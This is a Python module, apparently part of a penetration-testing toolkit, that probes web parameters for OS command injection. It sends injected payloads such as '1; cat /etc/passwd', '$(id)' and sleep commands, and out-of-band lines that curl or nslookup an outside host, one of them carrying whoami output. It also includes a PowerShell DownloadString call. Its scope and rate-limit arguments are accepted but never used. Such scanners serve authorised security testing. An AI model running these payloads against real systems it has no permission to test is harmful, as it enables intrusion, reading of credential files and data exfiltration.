"""Command Injection scanner — Linux/Windows, time-based, OOB, WAF bypass."""
from __future__ import annotations
import asyncio
import time
import urllib.parse
from typing import Any
from talisman.utils.http_client import TalismanHTTPClient
from talisman.utils.payload_engine import PayloadEngine, CMDI_PAYLOADS
from talisman.utils.logger import get_logger, console, print_finding

log = get_logger(__name__)

# Strings that confirm command execution in output
RCE_INDICATORS_LINUX = [
    "uid=", "gid=", "groups=",           # id command
    "root:x:0:0",                         # /etc/passwd
    "/bin/bash", "/bin/sh",               # shell paths
    "Linux version",                      # uname -a
    "proc/self",                          # /proc fs
    "total ", "drwx",                     # ls output
]
RCE_INDICATORS_WINDOWS = [
    "Windows IP Configuration",
    "Microsoft Windows",
    "C:\\Windows",
    "Volume in drive",
    "Directory of C:\\",
    "NT AUTHORITY\\SYSTEM",
    "NT AUTHORITY\\NETWORK SERVICE",
]

INJECT_HEADERS = [
    "User-Agent", "Referer", "X-Forwarded-For",
    "X-Real-IP", "X-Client-IP", "Cookie",
    "X-Forwarded-Host", "Host",
]

async def _test_cmdi_param(
    url: str,
    param: str,
    method: str,
    client: TalismanHTTPClient,
    oast_domain: str | None,
) -> dict[str, Any] | None:
    parsed = urllib.parse.urlparse(url)
    base_params = dict(urllib.parse.parse_qsl(parsed.query))

    # — Error-based (output in response) ——————————————————————————
    output_payloads = [
        f"1; id", f"1 | id", f"1 && id", f"`id`", f"$(id)",
        f"1; cat /etc/passwd", f"1 | cat /etc/passwd",
        f"1 & whoami", f"1 | whoami", f"1 && whoami",
    ]
    for payload in output_payloads:
        try:
            test_params = {**base_params, param: payload}
            if method == "GET":
                r = await client.get(
                    parsed._replace(query=urllib.parse.urlencode(test_params)).geturl()
                )
            else:
                r = await client.post(url, data={param: payload})
            for indicator in RCE_INDICATORS_LINUX + RCE_INDICATORS_WINDOWS:
                if indicator in r.text:
                    return {
                        "technique": "output_based",
                        "param": param,
                        "payload": payload,
                        "indicator": indicator,
                        "method": method,
                        "evidence": r.text[:300],
                        "request": f"{method} {url}?{param}={urllib.parse.quote(payload)} HTTP/1.1",
                    }
        except Exception:
            pass

    # — Time-based blind ———————————————————————————————————————
    baseline_times = []
    for _ in range(2):
        try:
            start = time.monotonic()
            bp = {**base_params, param: "1"}
            await client.get(parsed._replace(query=urllib.parse.urlencode(bp)).geturl(), timeout=8)
            baseline_times.append(time.monotonic() - start)
        except Exception:
            pass
    if not baseline_times:
        return None
    baseline = sum(baseline_times) / len(baseline_times)

    time_payloads = [
        "1; sleep 5", "1 | sleep 5", "1 && sleep 5", "$(sleep 5)", "`sleep 5`",
        "1; ping -c 5 127.0.0.1",
        "1 & timeout 5", "1 | timeout 5", "1 & ping -n 5 127.0.0.1",
        "1 & powershell -c Start-Sleep 5",
    ]
    for payload in time_payloads:
        try:
            test_params = {**base_params, param: payload}
            start = time.monotonic()
            if method == "GET":
                await client.get(
                    parsed._replace(query=urllib.parse.urlencode(test_params)).geturl(),
                    timeout=12,
                )
            else:
                await client.post(url, data={param: payload}, timeout=12)
            elapsed = time.monotonic() - start
            if elapsed > baseline + 4.0:
                return {
                    "technique": "time_based",
                    "param": param,
                    "payload": payload,
                    "elapsed": round(elapsed, 2),
                    "baseline": round(baseline, 2),
                    "method": method,
                    "request": f"{method} {url}?{param}={urllib.parse.quote(payload)} HTTP/1.1",
                }
        except asyncio.TimeoutError:
            return {
                "technique": "time_based_timeout",
                "param": param,
                "payload": payload,
                "method": method,
                "request": f"{method} {url}?{param}=[PAYLOAD] HTTP/1.1",
            }
        except Exception:
            pass

    # — OOB via OAST ———————————————————————————————————————————
    if oast_domain:
        oob_payloads = [
            f"; nslookup {oast_domain}",
            f"| curl http://{oast_domain}/",
            f"$(curl http://{oast_domain}/$(whoami))",
            f"& nslookup {oast_domain}",
            f"& powershell -c (New-Object Net.WebClient).DownloadString('http://{oast_domain}/')",
        ]
        for payload in oob_payloads:
            try:
                test_params = {**base_params, param: payload}
                if method == "GET":
                    await client.get(
                        parsed._replace(query=urllib.parse.urlencode(test_params)).geturl(),
                        timeout=8,
                    )
                else:
                    await client.post(url, data={param: payload}, timeout=8)
            except Exception:
                pass

    return None


async def run(
    target: str,
    session: Any = None,
    scope: Any = None,
    rate_limiter: Any = None,
    proxy: str | None = None,
    oast_domain: str | None = None,
    inject_headers: bool = True,
    **kwargs: Any,
) -> dict[str, Any]:
    url = target if "://" in target else f"https://{target}"
    console.print(f"\n[module]⚡ Command Injection Scanner[/module] → [target]{url}[/target]")
    findings: list[dict[str, Any]] = []

    parsed = urllib.parse.urlparse(url)
    params = list(dict(urllib.parse.parse_qsl(parsed.query)).keys())
    if not params:
        params = ["cmd", "exec", "command", "ping", "host", "ip", "dir",
                  "query", "name", "path", "id", "file"]

    async with TalismanHTTPClient(proxy=proxy, timeout=15) as client:
        tasks = []
        for param in params:
            for method in ["GET", "POST"]:
                tasks.append(_test_cmdi_param(url, param, method, client, oast_domain))
        results = await asyncio.gather(*tasks, return_exceptions=True)

        for result in results:
            if isinstance(result, dict):
                severity = "critical"
                title = (f"Command Injection ({result['technique']}) — "
                         f"param '{result['param']}' via {result['method']}")
                print_finding(title, severity, url)
                findings.append(result)
                if session:
                    await session.add_finding(
                        target=url, module="cmdi", vuln_type="command_injection",
                        severity=severity, confidence="confirmed",
                        title=title,
                        description=(
                            f"OS command injection confirmed via {result['technique']} technique. "
                            f"Parameter '{result['param']}' is injected into a shell command. "
                            f"Payload: {result.get('payload', 'N/A')}"
                        ),
                        request=result.get("request", ""),
                        evidence=result.get("evidence", result.get("indicator", "")),
                        reproduction=(
                            f"Send: {result['method']} {url}?"
                            f"{result['param']}={urllib.parse.quote(result.get('payload', ''))}"
                        ),
                        remediation=(
                            "1. Avoid passing user input to OS commands entirely.\n"
                            "2. If unavoidable, use allowlists to validate input strictly.\n"
                            "3. Use language-native APIs instead of shell commands (e.g., Python's subprocess with list args).\n"
                            "4. Sanitize and escape all user input before use in shell context."
                        ),
                        cvss_score=10.0, cwe="CWE-78",
                        references=["https://owasp.org/www-community/attacks/Command_Injection"],
                    )

    console.print(f"  Found {len(findings)} command injection points")
    return {"target": url, "findings": findings, "count": len(findings)}
